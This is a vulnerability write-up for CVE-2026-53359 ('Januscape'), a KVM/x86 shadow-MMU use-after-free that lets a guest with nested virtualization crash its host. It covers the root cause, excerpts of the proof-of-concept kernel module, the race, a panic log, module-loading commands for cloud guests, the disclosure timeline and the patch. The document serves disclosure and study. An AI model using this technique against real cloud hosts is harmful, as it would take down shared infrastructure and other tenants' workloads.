<p align="center">
  <img src="tux.png" width="400" alt="tux">
</p>

# Intro

![demo](demo.gif)

For the PoC code and usage, [see here](../README.md).

**Januscape (CVE-2026-53359)** is a guest-to-host vulnerability that exploits a use-after-free in the shadow MMU emulation of KVM/x86. Guest-side actions alone can trigger the bug and corrupt the shadow page state of the host kernel that runs the guest. Because the vulnerability lives in the shadow MMU code that x86 KVM shares between both Intel (VMX) and AMD (SVM), it is not limited to a single architecture, and to the best of public knowledge, this is the first guest-to-host exploit research triggerable on both Intel and AMD. It threatens the guest-host isolation of multi-tenant x86 public clouds (GCP, AWS, etc.) that accept untrusted guests and expose nested virtualization. In fact, this vulnerability was used as a 0-day in Google kvmCTF.

This article analyzes the root cause and the exploit flow of the published PoC, that is, the DoS that panics the host kernel with guest actions alone. It explains why each step is needed and what is tricky. A full escape exploit that uses the same bug to run code with root privilege on a host in a controlled environment also exists, but that exploit is not being released now and is outside the scope of this article.

# Background

There are two ways x86 KVM translates a guest virtual address into a host physical address. One is hardware two-stage paging (Intel EPT, AMD NPT), where the guest page tables are left as they are and the hardware handles the second stage from GPA to HPA. This path is the default on modern hosts (`kvm-intel.ept=1`, `tdp_mmu=Y`), and in that case KVM uses the TDP MMU. The other is shadow paging, where KVM shadows the guest page tables in software and keeps them as shadow pages (`struct kvm_mmu_page`, whose backing is the `sp->spt` 4KB page). The shadow MMU follows the page table tree managed by the guest, creating and linking a shadow page for each level.

The key here is nested virtualization. When a guest (L1) itself becomes a hypervisor and runs another guest (L2) inside it with EPT/NPT, the hardware two-stage paging has only one stage, so L0 (the host) must shadow in software the EPT/NPT that L1 built for L2. Because this nested EPT/NPT shadowing shadows page tables controlled by the guest, it goes through the legacy shadow MMU rather than the TDP MMU. This bug lies exactly in that process where the shadow MMU shadows guest page tables.

Another important point is that all of this happens inside in-kernel KVM. The faults that occur as L1 builds its own nested EPT and runs L2 are all handled by the host kernel KVM and never leave to a userspace VMM (such as QEMU). This bug is therefore a pure kernel KVM bug unrelated to QEMU emulation.

KVM keeps an rmap (reverse map) structure per memslot in order to reverse-track, by gfn, the leaf SPTEs that each shadow page maps. When it installs a leaf, it adds the SPTE pointer to that gfn rmap, and when it tears the leaf down, it removes it from the same rmap. The invariant of this data structure is that install and teardown see the same gfn key, and the breaking of this invariant is where this bug occurs.

# Root Cause

The function by which the shadow MMU follows the guest page tables and obtains a lower-level shadow page is `kvm_mmu_get_child_sp()`. The vulnerable source before the patch (`81ccda30b4e8`) is as follows.

```c
static struct kvm_mmu_page *kvm_mmu_get_child_sp(struct kvm_vcpu *vcpu,
						 u64 *sptep, gfn_t gfn,
						 bool direct, unsigned int access)
{
	union kvm_mmu_page_role role;

	if (is_shadow_present_pte(*sptep) && !is_large_pte(*sptep) &&
	    spte_to_child_sp(*sptep) && spte_to_child_sp(*sptep)->gfn == gfn)  // <=[1]
		return ERR_PTR(-EEXIST);

	role = kvm_mmu_child_role(sptep, direct, access);
	return kvm_mmu_get_shadow_page(vcpu, gfn, role);
}
```

The reuse decision at `[1]` compares only the `gfn` of the child shadow page already linked at `sptep`, and does not compare the `role` of that shadow page. The role holds what kind of shadow page this is. In particular, `role.direct` distinguishes whether this page is one that shadowed a guest page table (indirect, `direct=0`) or one that KVM split from a large page into 4KB (direct split, `direct=1`).

A situation where children of different roles are needed for the same gfn arises naturally in the shadow MMU fetch path.

```c
static int FNAME(fetch)(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault,
			 struct guest_walker *gw)
{
	[...]
	for_each_shadow_entry(vcpu, fault->addr, it) {
		[...]
		sp = kvm_mmu_get_child_sp(vcpu, it.sptep, table_gfn,
					  false, access);   // <=[2]
		[...]
	}

	kvm_mmu_hugepage_adjust(vcpu, fault);
	[...]
	for (; shadow_walk_okay(&it); shadow_walk_next(&it)) {
		[...]
		sp = kvm_mmu_get_child_sp(vcpu, it.sptep, base_gfn,
					  true, direct_access);   // <=[3]
		[...]
	}
	[...]
}
```

`[2]` creates an indirect shadow page that shadows a guest page table when an upper entry points to that table. `[3]` creates a direct split shadow page when a large page (2MB) cannot be mapped as is by the host and is split into 4KB. In both cases the target gfn can be the same, and because `[1]` does not look at the role, when a direct split (`direct=1`) from `[3]` is already linked at `sptep` and `[2]` requests an indirect (`direct=0`), it returns `-EEXIST` on gfn match alone. Then fetch does not create a new shadow page of the correct role but reuses the existing page of the wrong role as is. This is the root cause of Januscape.

## use-after-free path

This reuse makes a shadow page be referenced with the wrong role, breaking the lifetime and parent pointer accounting of that page. As a result, a state is created in which one shadow page has already been freed, yet another shadow page still holds a pointer into it (an orphaned parent pointer).

Later, when the shadow MMU cleans up that structure and clears the orphaned pointer, it writes a single fixed constant into that location.

```
__kvm_mmu_prepare_zap_page()
  kvm_mmu_unlink_parents()
    drop_parent_pte()
      mmu_spte_clear_no_track(sptep)   <=[4]
        __update_clear_spte_fast()
          WRITE_ONCE(*sptep, SHADOW_NONPRESENT_VALUE)   <=[5]
```

```c
static void drop_parent_pte(struct kvm *kvm, struct kvm_mmu_page *sp,
			    u64 *parent_pte)
{
	mmu_page_remove_parent_pte(kvm, sp, parent_pte);
	mmu_spte_clear_no_track(parent_pte);   // <=[4]
}

static void mmu_spte_clear_no_track(u64 *sptep)
{
	__update_clear_spte_fast(sptep, SHADOW_NONPRESENT_VALUE);   // <=[5]
}

#ifdef CONFIG_X86_64
#define SHADOW_NONPRESENT_VALUE  BIT_ULL(63)
#else
#define SHADOW_NONPRESENT_VALUE  0ULL
#endif
```

At `[4]` the kernel believes it is "clearing one slot of a shadow page", but if that page has already been freed and reallocated as another kernel object (the victim), the `WRITE_ONCE` at `[5]` writes the fixed constant into that victim memory. That is, it is a use-after-free write that actually writes into memory that was reoccupied after being freed. At this point, all the guest can decide is which slot (offset) within that page to write to, and the value is fixed.

## DoS path

The same corruption has a much simpler second outcome, and the public PoC uses this one. It is that the kernel catches the corruption in its own integrity check and panics by itself. The reused direct split page has no `shadowed_translation`, so it computes the leaf gfn as `sp->gfn + index`; therefore a leaf installed through it is registered in the rmap under the real guest gfn, but when it is removed it is looked up under the computed gfn.

```c
static void kvm_mmu_page_set_translation(struct kvm_mmu_page *sp, int index,
					 gfn_t gfn, unsigned int access)
{
	if (sp->shadowed_translation) {
		sp->shadowed_translation[index] = (gfn << PAGE_SHIFT) | access;
		return;
	}
	[...]
	WARN_ONCE(gfn != kvm_mmu_page_get_gfn(sp, index),   // <=[6]
		  "gfn mismatch under %s page %llx (expected %llx, got %llx)\n",
		  sp->role.passthrough ? "passthrough" : "direct",
		  sp->gfn, kvm_mmu_page_get_gfn(sp, index), gfn);
}
```

The `WARN_ONCE` at `[6]` is merely a downstream symptom that reports this gfn mismatch ("gfn mismatch under direct page"). What is actually fatal is what comes next. When the leaf is removed from the rmap while the two keys are diverged, the looked-up rmap has no entry, and at that moment the kernel corruption detection fires.

```
kvm_mmu_page_fault()
  kvm_mmu_do_page_fault()
    ept_page_fault()
      ept_fetch()
        mmu_set_spte()
          drop_spte()
            rmap_remove()
              pte_list_remove()            <=[7]
                KVM_BUG_ON_DATA_CORRUPTION -> BUG   <=[8]
```

```c
static void pte_list_remove(struct kvm *kvm, u64 *spte,
			    struct kvm_rmap_head *rmap_head)
{
	struct pte_list_desc *desc;
	unsigned long rmap_val;
	int i;

	rmap_val = kvm_rmap_lock(kvm, rmap_head);
	if (KVM_BUG_ON_DATA_CORRUPTION(!rmap_val, kvm))   // <=[7]
		goto out;
	if (!(rmap_val & KVM_RMAP_MANY)) {
		if (KVM_BUG_ON_DATA_CORRUPTION((u64 *)rmap_val != spte, kvm))
			goto out;
		[...]
	} else {
		[...]
		KVM_BUG_ON_DATA_CORRUPTION(true, kvm);
	}
	[...]
}
```

`[7]` is the integrity check that `pte_list_remove` applies as it removes an entry from the rmap. It treats the state as corruption if the looked-up rmap is empty, if the sole entry differs from the expected `spte`, or if that `spte` is nowhere in the chain of multiple entries. The definition of `KVM_BUG_ON_DATA_CORRUPTION` used in this check is as follows.

```c
#define KVM_BUG_ON_DATA_CORRUPTION(cond, kvm)		\
({						\
	bool __ret = !!(cond);				\
	if (IS_ENABLED(CONFIG_BUG_ON_DATA_CORRUPTION))	\
		BUG_ON(__ret);		/* <=[8] */	\
	else if (WARN_ON_ONCE(__ret && !(kvm)->vm_bugged))	\
		kvm_vm_bugged(kvm);			\
	unlikely(__ret);				\
})
```

At `[8]`, when `CONFIG_BUG_ON_DATA_CORRUPTION=y` (the default in distributions such as RHEL) is combined with `panic_on_oops`, it is an immediate host panic. Unlike the use-after-free write, this DoS path needs neither to have the freed page reoccupied by a victim nor to control the value.

# Exploit

`poc.c` is a kernel module loaded inside the guest. Inside the guest (L1), the module directly builds and runs its own nested guest (L2) with raw VMX (Intel) or SVM (AMD). Once L2 exists, the host (L0) must shadow L1 nested EPT/NPT with the shadow MMU, and in that process the role-gap reuse from Root Cause fires on L0 and panics L0.

The level structure is as follows. L0 is the bare-metal Intel KVM host that runs the guest and is the panic target (an AMD SVM host is the same). L1 is the guest allocated to the attacker, into which the module is loaded. L2 is the nested guest that the module brings up with raw VMX/SVM. The bug goes off on L0 when L0 shadows L1 nested page tables.

## 1. Building the nested page tables and the L2 image

The poc module directly builds the L2 nested page tables and the L2 guest image inside its own (L1) RAM (`build_world()`). The premise of this exploit is a geometry that uses a single physical page simultaneously as both the leaf of a large page and a page table page.

```c
static int build_world(void)
{
	[...]
	ptg = (u64 *)greg_va;   // <=[10]
	ptg_pa = greg_pa;
	[...]
	nest_pd[PDE_IDX] = ops->huge_pte(greg_pa);   // <=[11]
	[...]
	ptg[0]         = ops->leaf4k(greg_pa);
	ptg[PRIME_IDX] = ops->leaf4k(q_pa);   // <=[12]
	[...]
}
```

At `[10]` the nested PT page `ptg` is taken as the first page of `greg` (`ptg_pa == greg_pa`). Then, as in `[11]`, the gfn when `nest_pd[PDE_IDX]` maps `greg` as a 2MB large page and the `table_gfn` when the same PDE points to `ptg` as a page table both become `greg_pa >> 12`, so they are equal. The gfn matches but the role differs. At `[12]`, one entry of that PT is made to point to a separate `q` page (gfn Q, a probe page filled with 0x4141...), so that when the reused direct page installs a leaf, the real gfn (Q) diverges from the direct assumption (`sp->gfn+index`).

L2 code (`ncode`) has the form `movabs rax, GVA; mov rax,[rax]; vmcall`, reading GVA once to induce a nested EPT/NPT violation and then exiting. This read drives L0 shadow MMU fetch.

## 2. The dual-arch design that spans Intel and AMD

Because the bug is in the x86-common shadow MMU, the PoC works identically on both Intel and AMD by swapping only the architecture-specific page table bits. This is implemented with the `virt_ops` abstraction.

```c
struct virt_ops {
	[...]
	u64 (*huge_pte)(u64 pa);
	u64 (*tbl_pte)(u64 pa);
	u64 (*leaf4k)(u64 pa);
	[...]
};
static u64 vmx_huge_pte(u64 pa){ return pa | EPT_LEAF | EPT_PS; }   // <=[13]
static u64 svm_huge_pte(u64 pa){ return pa | PF_P|PF_RW|PF_US|PF_PS; }   // <=[14]
[...]
ops = amd ? &svm_ops : &vmx_ops;   // <=[15]
```

`[13]` is the Intel EPT entry bits (RWX, memory type, PS), and `[14]` is the AMD NPT entry bits (P/RW/US/PS). At `[15]` the backend is chosen according to the module parameter `amd`. The Intel path makes EPT12 be shadowed via `vmxon`/`vmlaunch`, and the AMD path makes the nested NPT be shadowed via `vmrun`. Both paths use the same `nest_pd[PDE_IDX]` huge/table toggle and the same L2 fault. This dual-arch holds because `kvm_mmu_get_child_sp`, where the reuse happens, is in `arch/x86/kvm/mmu/mmu.c`, which VMX and SVM share.

## 3. Why the shadow MMU is reached even on ept=1 hosts

On a default (`ept=1`, `tdp_mmu=Y`) host, the direct GPA translation of a guest is handled by hardware EPT and the TDP MMU, so it does not go through `kvm_mmu_get_child_sp`. However, once L1 runs a nested guest (L2), L0 must shadow L1 nested EPT in software.

```c
void kvm_init_shadow_ept_mmu(struct kvm_vcpu *vcpu, bool execonly,
			     int huge_page_level, bool accessed_dirty,
			     gpa_t new_eptp)
{
	struct kvm_mmu *context = &vcpu->arch.guest_mmu;   // <=[16]
	[...]
	context->page_fault = ept_page_fault;   // <=[17]
	[...]
}

static inline bool is_tdp_mmu_active(struct kvm_vcpu *vcpu)
{
	return tdp_mmu_enabled && vcpu->arch.mmu->root_role.direct;   // <=[18]
}
```

The nested-EPT MMU (`guest_mmu`) at `[16]` shadows page tables controlled by the guest, so its `root_role.direct` is false. Therefore, when initializing the MMU, KVM installs not the TDP fault handler (`kvm_tdp_page_fault`) but the legacy `ept_page_fault` at `[17]`, and this handler reaches `kvm_mmu_get_child_sp` by way of `FNAME(fetch)`. `is_tdp_mmu_active` at `[18]` is also false because it is non-direct, so the TDP MMU lockless path does not apply either. That is, even on a default host, as long as the guest uses nested EPT, it reaches this bug path. On AMD as well, the corresponding function `kvm_init_shadow_npt_mmu` uses the same non-direct `guest_mmu` and the same fetch path.

## 4. The race: non-atomic PDE toggle window

Triggering requires two kinds of vCPU. The writer keeps toggling `nest_pd[PDE_IDX]` between huge and table, and the faulters repeatedly run L2 to keep raising faults that pass through that PDE.

```c
static int kthr(void *arg)
{
	[...]
	nest_pd[PDE_IDX] = ops->huge_pte(greg_pa);   // <=[19]
	for (k = 0; k < dwell; k++) cpu_relax();
	nest_pd[PDE_IDX] = ops->tbl_pte(ptg_pa);   // <=[20]
	for (k = 0; k < dwell; k++) cpu_relax();
	[...]
}
```

When the writer writes huge at `[19]`, the PDE tries to map `greg` as 2MB, but if `ptg` (`ptg_pa == greg_pa`), which uses the same gfn, is shadowed, `account_shadowed` disallows a large page for that gfn (`disallow_lpage`), so `kvm_mmu_hugepage_adjust` lowers the fault to 4KB and creates a direct split (`direct=1`) shadow page. When the writer writes table at `[20]`, the PDE points to `ptg`, so L0 comes to need an indirect (`direct=0`) shadow page at the same gfn.

The heart of the race is the non-atomic window that arises when L0 emulates the writer PDE write. There is a gap between the moment L0 commits the new PDE value and the moment it zaps the old shadow link at `kvm_page_track_write`, and if a faulter faults in that gap, `kvm_mmu_get_child_sp` is called with the new role while the child of the old role is still linked at `sptep`, so the gfn-match reuse at `[1]` holds. With several faulters (`nvcpu=8`), they contend over `mmu_lock` and delay the writer track_write, so the window widens. The time to win varies widely from seconds to minutes, but as long as the code is vulnerable, enough racing triggers it deterministically.

## 5. Host panic

When a direct split page is reused as indirect within the window, the leaf (gfn Q) from `[12]` is installed, the real gfn diverges from the direct assumption, the "gfn mismatch under direct page" WARN from `[6]` fires first, and the rmap is registered under the real gfn key. Later, when another fault overwrites and drops that leaf at the same location, `pte_list_remove` looks up the rmap under the computed key (`sp->gfn+index`) but does not find that entry, and hits the `KVM_BUG_ON_DATA_CORRUPTION` at `[7]`. The following is a panic log triggered on RHEL (6.12.0-211.26.1.el10_2.x86_64).

```
gfn mismatch under direct page 8a00 (expected 8b00, got 256e4)
WARNING: CPU: 6 PID: 974281 at arch/x86/kvm/mmu/mmu.c:689 kvm_mmu_page_set_translation.part.0+0xb7/0x130 [kvm]
CPU: 6 PID: 974281 Comm: qemu-kvm  6.12.0-211.26.1.el10_2.x86_64
kernel BUG at arch/x86/kvm/mmu/mmu.c:1091!
RIP: 0010:pte_list_remove.isra.0+0xd9/0xe0 [kvm]
CPU: 3 PID: 974278 Comm: qemu-kvm
```

## 6. From PoC to a real cloud guest

The public PoC is a kernel module loaded inside the guest. When you are allocated an instance in the cloud, you usually have root over your own VM, so the module load requirement is met. The only premise is that the instance must have nested virtualization exposed. Because the module takes raw VMX/SVM state directly, the in-tree KVM module must be unloaded before loading. On Intel it is loaded with no argument, and on AMD with `amd=1`.

```
[Intel]  # rmmod kvm_intel; insmod poc.ko
[AMD]    # rmmod kvm_amd;   insmod poc.ko amd=1
```

What the module does (building nested page tables in its own RAM with raw VMX/SVM, running a nested guest, toggling the PDE, and raising faults) is all normal behavior that a guest with nested virtualization exposed can perform with its own privileges. No separate host-side cooperation is needed.

## 7. On the full escape exploit

Turning this vulnerability into a full escape is difficult work, because the primitive is tricky. The page that gets reoccupied is the spt of a shadow page that was zapped, returned to buddy, and then refilled. After it is freed, KVM installs no more leaf SPTEs on this page, so the only remaining write is the single fixed constant (on x86-64, `0x8000000000000000`) that clears the orphaned parent pointer, and the guest only decides which slot (offset) to write to. Because of this, one must carefully choose a guest-side cross-cache object where that fixed write aligns to a meaningful field, and depending on how the object is allocated it can be dependent on the guest VM's RAM quota.

Because of this tricky primitive, each architecture must be exploited in a different way, and empirically, the AMD-specific exploit is a little easier.

# Disclosure Timeline

- 2026-06-12: Submitted detailed information about the Januscape vulnerability and an exploit to security@kernel.org.
- 2026-06-13: Discussed how to handle the patch with the KVM maintainers Paolo and Sean, and Paolo wrote a patch for the vulnerability.
- 2026-06-17: Paolo posted the patch to [lore](https://lore.kernel.org/all/20260617134425.440091-1-pbonzini@redhat.com/) for testing before the pull request.
- 2026-06-19: The [81ccda30b4e8 patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=81ccda30b4e8) was merged into mainline.
- 2026-07-01: Submitted information about the vulnerability and the exploit to the linux-distros mailing list. The embargo was set to 5 days.
- 2026-07-04: Januscape was assigned CVE-2026-53359.
- 2026-07-06: After the embargo ended, posted information about Januscape to the oss-security mailing list, and this document was published.

# Patch

This vulnerability was fixed in `81ccda30b4e8`, which adds a `role.word` comparison to the child shadow page reuse condition of `kvm_mmu_get_child_sp()`, changing it so that the existing page is reused only when not just the gfn but also the role matches. The patch is as follows.

```diff
diff --git a/arch/x86/kvm/mmu/mmu.c b/arch/x86/kvm/mmu/mmu.c
index 9368a71336fe4..c13b80fe3125b 100644
--- a/arch/x86/kvm/mmu/mmu.c
+++ b/arch/x86/kvm/mmu/mmu.c
@@ -2459,13 +2459,15 @@ static struct kvm_mmu_page *kvm_mmu_get_child_sp(struct kvm_vcpu *vcpu,
 						 u64 *sptep, gfn_t gfn,
 						 bool direct, unsigned int access)
 {
-	union kvm_mmu_page_role role;
+	union kvm_mmu_page_role role = kvm_mmu_child_role(sptep, direct, access);
 
-	if (is_shadow_present_pte(*sptep) && !is_large_pte(*sptep) &&
-	    spte_to_child_sp(*sptep) && spte_to_child_sp(*sptep)->gfn == gfn)
+	if (is_shadow_present_pte(*sptep) &&
+	    !is_large_pte(*sptep) &&
+	    spte_to_child_sp(*sptep) &&
+	    spte_to_child_sp(*sptep)->gfn == gfn &&
+	    spte_to_child_sp(*sptep)->role.word == role.word)
 		return ERR_PTR(-EEXIST);
 
-	role = kvm_mmu_child_role(sptep, direct, access);
 	return kvm_mmu_get_shadow_page(vcpu, gfn, role);
 }
```

Before the fix, the reuse decision compared only the `gfn` of the child shadow page. So for the same gfn, a direct split (`direct=1`) that split a large page and an indirect (`direct=0`) that shadowed a guest page table were reused even though their roles differed, and this role confusion threw off the rmap accounting and led to a use-after-free. The patch adds `spte_to_child_sp(*sptep)->role.word == role.word` to the reuse condition and reuses the existing page with `-EEXIST` only when both the gfn and the role match. If the role differs, this condition does not hold, so fetch creates a new shadow page of the correct role instead of reusing the page of the wrong role, and therefore the rmap corruption and use-after-free path that began from role confusion disappear.
